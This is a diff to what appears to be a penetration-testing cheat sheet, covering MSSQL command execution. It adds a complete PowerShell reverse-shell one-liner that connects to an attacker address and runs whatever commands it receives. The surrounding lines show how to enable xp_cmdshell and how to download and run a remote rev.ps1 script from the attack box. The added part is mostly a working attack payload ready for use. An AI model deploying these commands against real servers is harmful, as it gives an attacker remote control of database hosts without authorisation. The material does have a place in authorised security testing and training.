@@ -243,6 +243,11 @@ To run shell commands if enabled:
     SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';  #check if enabled    
     sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;    #configure and enable xp_cmdshell   
     xp_cmdshell 'whoami';    
+    
+Get a reverse shell using xp_cmdshell (host rev.ps1 file on attack box):    
+
+    $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()       
+
     EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/rev.ps1") | powershell -noprofile'   #exec PowerShell script   
 
 ### TCP Port 2049: NFS 
